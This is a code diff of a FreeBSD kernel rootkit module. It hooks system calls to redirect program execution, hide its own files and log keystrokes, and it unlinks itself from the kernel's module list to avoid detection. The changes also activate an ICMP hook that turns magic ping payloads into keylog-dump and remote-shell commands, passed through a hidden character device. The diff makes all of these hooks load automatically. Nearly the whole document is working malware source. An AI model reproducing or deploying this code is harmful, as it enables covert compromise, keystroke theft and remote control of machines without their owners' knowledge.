@@ -40,6 +40,9 @@
 #define MODULE_NAME "rootkit"
 #define FILE_NAME "rootkit.ko"
 #define LOG_FILE "/log.txt"
+#define CMDLEN 100
+#define KEYLOG "1337"
+#define RSHELL "nani"
 
 extern linker_file_list_t linker_files;
 extern struct sx kld_sx;
@@ -86,6 +89,7 @@ static struct module *save_mod;
 
 static int activated = 0;
 
+// List of files to be hidden
 char *T_NAME[] = {"rootkit.ko", "controller", "priv_esc", "log.txt", "controller.c"};
 static int t_name_len = sizeof(T_NAME)/sizeof(T_NAME[0]);
 
@@ -97,6 +101,8 @@ char* redir_pair[][2] = {
 */
 //static int redir_pair_len = sizeof(redir_pair)/sizeof(redir_pair[0]);
 
+// Execution redirection
+//===============================================================================
 static int execve_hook(struct thread *td, void *syscall_args)
 {
 	struct execve_args *uap;
@@ -153,9 +159,11 @@ static int execve_hook(struct thread *td, void *syscall_args)
 	}
 	return(sys_execve(td, syscall_args));
 }
+//===============================================================================
 
+// Hide files from being listed
+//===============================================================================
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
-
 	struct getdirentries_args *uap;
 	uap = (struct getdirentries_args *)syscall_args;
 
@@ -197,10 +205,9 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
 
 	return 0;
 }
+//===============================================================================
 
 //================================== KEY LOGGING ================================
-
-
 static int write_kernel2userspace(struct thread *td, char c){
 
 	int error;
@@ -260,8 +267,6 @@ static int write_kernel2userspace(struct thread *td, char c){
 	return(error);
 }
 
-
-
 static int read_hook(struct thread *td, void *syscall_args){
 
 	struct read_args *uap;
@@ -282,9 +287,10 @@ static int read_hook(struct thread *td, void *syscall_args){
 
 	return(error);
 }
-
 //==============================================================================
 
+// Hide the kernel module from being listed
+//==============================================================================
 static int hide_kld(void)
 {
     struct linker_file *lf;
@@ -366,8 +372,68 @@ static int unhide_kld(void){
     
     return 0;
 }
+//==============================================================================
+
+// Create a character device
+//==============================================================================
+
+d_open_t open;
+d_close_t close;
+d_read_t read;
+d_write_t write;
+
+static struct cdevsw devsw = {
+.d_version = D_VERSION,
+.d_open = open,
+.d_close = close,
+.d_read = read,
+.d_write = write,
+.d_name = "cd"
+};
+
+static char icmp_cmd[CMDLEN] = "none";
+static size_t len = 4;
+
+int open(struct cdev *dev, int flag, int otyp, struct thread *td) {
+	return 0;
+}
+
+int close(struct cdev *dev, int flag, int otyp, struct thread *td) {
+	return 0;
+}
+
+int write(struct cdev *dev, struct uio *uio, int ioflag) {
+	int error = 0;
+	error = copyinstr(uio->uio_iov->iov_base, &icmp_cmd, CMDLEN-1, &len);
+	if (error != 0) {
+		uprintf("Write to device failed\n");
+	}
+	return error;
+}
+
+int read(struct cdev *dev, struct uio *uio, int ioflag) {
+	int error = 0;
+	if (len <= 0) {
+		error = -1;
+	}
+	else {
+		copystr(&icmp_cmd, uio->uio_iov->iov_base, CMDLEN, &len);
+	}
+	memset(&icmp_cmd, '\0', CMDLEN);
+	strcpy(icmp_cmd, "none");
+	len = 4;
+	return error;
+}
+
+static struct cdev *sdev;
 
 //==============================================================================
+
+// ICMP hook
+//==============================================================================
+
+extern struct protosw inetsw[];
+int icmp_input_hook(struct mbuf **m, int *off, int proto);
 
 int icmp_input_hook(struct mbuf **m, int *off, int proto){
 	struct icmp *icp;
@@ -385,30 +451,29 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 	(*m)->m_data -= hlen;
 
 	/* Is this the ICMP message we are looking for? */
-	if (strncmp(icp->icmp_data, KEYLOG, 3) == 0) {
-		printf("send keylog.\n");
-		strcpy(cmd, "key");
-		return(0);
+	if (strncmp(icp->icmp_data, KEYLOG, 4) == 0) {
+		printf("icmp key\n");
+		strncpy(icmp_cmd, "key", 3);
+		len = 3;
+		return 0;
 	}
 
-	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
-			printf("send shell.\n");
-			strcpy(cmd, "shell");
-			return(0);
+	else if (strncmp(icp->icmp_data, RSHELL, 4) == 0) {
+		printf("icmp shell\n");
+		strncpy(icmp_cmd, "shell", 5);
+		len = 5;
+		return 0;
 	}
 	else
-		printf("pinged\n");
 		return (icmp_input(m, off, proto));
 
 	return (icmp_input(m, off, proto));
 }
 //==============================================================================
 
-
 struct control_arg{
 	char *option;	
 };
-
 
 static int control(struct thread *td, void *arg) {
 	struct control_arg *uap;
@@ -417,8 +482,8 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
-		//inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
-        //sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
+		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+        sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "cd");
 		hide_kld();
 		activated = 1;
 	}
@@ -426,8 +491,8 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-		//inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
-		//destroy_dev(sdev);
+		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+		destroy_dev(sdev);
 		unhide_kld();
 		activated = 0;
 	}
@@ -447,24 +512,24 @@ static int load(struct module *module, int cmd, void *arg) {
 	switch (cmd) {
 		case MOD_LOAD:
 			uprintf("Rootkit loaded at %d\n", offset);
-			// sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
-			// sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
-			// sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
-			//inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
-        	//sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
-			// hide_kld();
-			// activated = 1;
+			sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
+			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+        	sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "cd");
+			hide_kld();
+			activated = 1;
 			break;
 			
 		case MOD_UNLOAD:
-			// uprintf("Rootkit unloaded from %d\n", offset);
-			// sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
-			// sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-			// sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-			// inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
-			// destroy_dev(sdev);
-			// unhide_kld();
-			// activated = 0;
+			uprintf("Rootkit unloaded from %d\n", offset);
+			sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
+			sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+			sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+			destroy_dev(sdev);
+			unhide_kld();
+			activated = 0;
 			break;
 			
 		default:
